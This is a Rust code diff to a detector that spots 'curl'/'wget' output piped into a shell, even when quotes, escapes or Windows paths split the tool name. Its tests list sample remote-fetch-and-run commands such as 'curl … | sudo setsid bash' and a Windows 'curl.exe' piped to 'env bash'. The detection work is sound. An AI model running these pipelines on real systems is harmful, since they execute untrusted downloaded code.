@@ -285,20 +285,35 @@ fn names_one_of(word: &str, names: &[&str]) -> bool {
 }
 
 /// The first `curl`/`wget` end, in bytes of `command`, also when quoting or
-/// escapes split the word (`c'url'`, `w\get`).
+/// escapes split the word (`c'url'`, `w\get`). Quotes are removed with and
+/// without backslashes, as removing them joins `C:\x\curl.exe` into
+/// `C:xcurl.exe`. A match followed by `/` or `\` names a folder, not the tool.
 fn first_fetch_end(command: &str) -> Option<usize> {
-    let mut unquoted = String::with_capacity(command.len());
-    // (end in `unquoted`, end in `command`) for each kept character.
+    let quotes = |c: char| matches!(c, '\'' | '"');
+    let quotes_and_escapes = |c: char| matches!(c, '\'' | '"' | '\\');
+    fetch_end_without(command, quotes)
+        .into_iter()
+        .chain(fetch_end_without(command, quotes_and_escapes))
+        .min()
+}
+
+/// The first `curl`/`wget` end in `command` with the `dropped` characters
+/// removed, mapped back to bytes of `command`.
+fn fetch_end_without(command: &str, dropped: impl Fn(char) -> bool) -> Option<usize> {
+    let mut kept = String::with_capacity(command.len());
+    // (end in `kept`, end in `command`) for each kept character.
     let mut ends = Vec::with_capacity(command.len());
     for (at, c) in command.char_indices() {
-        if !matches!(c, '\'' | '"' | '\\') {
-            unquoted.push(c);
-            ends.push((unquoted.len(), at + c.len_utf8()));
+        if !dropped(c) {
+            kept.push(c);
+            ends.push((kept.len(), at + c.len_utf8()));
         }
     }
-    let end = FETCH.find(&unquoted)?.end();
+    let found = FETCH
+        .find_iter(&kept)
+        .find(|found| !kept[found.end()..].starts_with(['/', '\\']))?;
     ends.iter()
-        .find(|(kept, _)| *kept == end)
+        .find(|(kept_end, _)| *kept_end == found.end())
         .map(|(_, original)| *original)
 }
 
@@ -586,6 +601,10 @@ mod tests {
             "curl https://example.com/x | setsid -w bash",
             "curl https://example.com/x | ionice -c3 bash",
             "curl https://example.com/x | sudo setsid bash",
+            // A Windows path: removing backslashes joins `curl` to its folder.
+            r#""C:\Windows\System32\curl.exe" https://x/i | env bash"#,
+            r"C:\Windows\System32\curl.exe https://x/i | env bash",
+            r"C:\Windows\System32\c'url'.exe https://x/i | env bash",
         ] {
             assert!(hits(command), "not caught: {command:?}");
         }
@@ -601,6 +620,9 @@ mod tests {
             "curl https://example.com/data.json | jq .name",
             "wget https://example.com/file.tar.gz | tar xz",
             "curl https://example.com | grep sha256",
+            // A folder named like a fetch tool is not the fetch tool.
+            r#""C:\curl\helper.exe" https://x/i | env bash"#,
+            "/opt/wget/helper https://x/i | env bash",
             "wget https://example.com | shasum -a 256",
             "curl https://example.com/install | shellcheck -",
             "curl https://example.com/key | sudo tee keyring.gpg",
